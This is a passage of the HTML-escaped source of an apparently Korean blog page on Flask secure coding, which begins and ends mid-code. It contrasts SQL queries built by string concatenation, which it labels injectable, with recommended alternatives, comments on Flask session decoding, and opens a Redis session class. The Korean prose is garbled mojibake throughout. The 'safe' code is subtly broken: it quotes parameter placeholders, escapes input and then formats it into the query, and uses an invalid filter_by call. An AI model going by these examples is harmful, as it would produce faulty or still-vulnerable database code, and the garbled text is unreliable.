&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='{}' AND pw='{}'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; AND pw='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;f&quot;SELECT * FROM user WHERE uid='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' AND pw='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;SQLAlchemy(2.x) ì˜ëª»ëœ ì¸ìê°’ ì „ë‹¬ ë°©ë²•&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;app.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='%s' AND pw='%s'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='{}' AND pw='{}'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; AND pw='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;f&quot;SELECT * FROM user WHERE uid='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' AND pw='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ queryë¥¼ ë„˜ê²¨ì£¼ê²Œ ë˜ë©´ Escapable í•˜ê¸° ë•Œë¬¸ì— SQL Injectionì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ„ì™€ ê°™ì€ ë°©ë²•ì€ ê¶Œì¥ë˜ì§€ ì•Šìœ¼ë©°, ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì½”ë“œë¥¼ ì‘ì„±í•˜ëŠ” ê²ƒì´ ë°”ëŒì§í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PyMySQL(or SQLite), ì•ˆì „í•œ ì¸ìê°’ ì „ë‹¬ ë°©ë²•(1)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;app.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pymysql&lt;/span&gt;    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;escape_string&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# using pymysql.escape_string()
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='%s' AND pw='%s'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='{}' AND pw='{}'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; AND pw='&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;f&quot;SELECT * FROM user WHERE uid='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' AND pw='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PyMySQL(or SQLite), ì•ˆì „í•œ ì¸ìê°’ ì „ë‹¬ ë°©ë²•(2)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;app.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='%(uid)s' AND pw='%(pw)s'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'uid'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'pw'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;SQLAlchemy, ì•ˆì „í•œ ì¸ìê°’ ì „ë‹¬ ë°©ë²•&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;app.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# SQLAlchmey ê¶Œì¥
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# db.session.execute()ë¥¼ ì‚¬ìš©í•´ì•¼ í•  ê²½ìš°
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='%(uid)s' AND pw='%(pw)s'&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'uid'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'pw'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;12-session-module&quot;&gt;1.2. Session Module&lt;/h2&gt;

&lt;p&gt;Flaskì—ì„œ ì œê³µë˜ëŠ” ê¸°ë³¸ ì„¸ì…˜ì€ JWT í˜•íƒœì™€ ìœ ì‚¬í•œ í˜•íƒœì…ë‹ˆë‹¤. JWTì™€ ìœ ì‚¬í•œ í˜•íƒœì´ë¯€ë¡œ Headerì™€ Payload, Signatureë¡œ êµ¬ë¶„ë˜ëŠ”ë°, Signatureë¥¼ ì œì™¸í•œ ê°’ë“¤ì€ Base64ë¡œ ì¸ì½”ë”© ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê°„ë‹¨í•˜ê²Œ Decodingì´ ê°€ëŠ¥í•˜ì—¬ ì„¸ì…˜ì— ì €ì¥ëœ ê°’ì„ ë³µí˜¸í™” í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sik0700.png&quot; alt=&quot;/assets/sik0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Session ë³µí˜¸í™”ì˜ ê²½ìš° ìœ„í—˜í•œ ì·¨ì•½ì ì€ ì•„ë‹ˆì§€ë§Œ, ì„¸ì…˜ì— ë¹„ë°€ë²ˆí˜¸ë‚˜ ì´ìš©ìì˜ ì¤‘ìš” ì •ë³´ë¥¼ ì‚½ì…í•˜ì—¬ ì‚¬ìš©í•  ê²½ìš° ì •ë³´ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë•Œë¬¸ì— ìœ„ì™€ ê°™ì´ í•„ìš”í•œ ìµœì†Œí•œì˜ ì •ë³´ë§Œ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë°”ëŒì§í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¨, ìœ„ì™€ ê°™ì€ ì„¸ì…˜ ê°’ì€ ë”°ë¡œ session timeoutê³¼ ê°™ì€ ì„¤ì •ì´ ë˜ì–´ ìˆì§€ ì•Šì•„ ì–¸ì œë“  timeout ê°’ì„ ë”°ë¡œ ì„¤ì •í•´ì£¼ì§€ ì•Šì„ ì‹œ íƒˆì·¨ë˜ì–´ ì´ìš©ë  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ Flaskì—ì„œëŠ” ë³´ë‹¤ ì•ˆì „í•œ ì„¸ì…˜ ê´€ë¦¬ë¥¼ ìœ„í•´ RedisSessionInterface, FileSystemSessionInterface, MongoDBSessionInterface, SqlAlchemySessionInterface ë“±ì„ ì œê³µí•©ë‹ˆë‹¤. ê¸°ë³¸ì ì¸ ì„¸ì…˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì´ìš©í•˜ëŠ” ê²ƒë³´ë‹¤ ì´ë“¤ì„ ê²¸í•˜ì—¬ í•¨ê»˜ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ê¶Œì¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Redis Session Class Example&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# http://egloos.zum.com/mcchae/v/11184587
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuid4&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timedelta&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask.sessions&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionMixin&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;werkzeug.datastructures&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CallbackDict&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;redis&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#########################################################################################
# This is a session object. It is nothing more than a dict with some extra methods
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RedisSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CallbackDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionMixin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
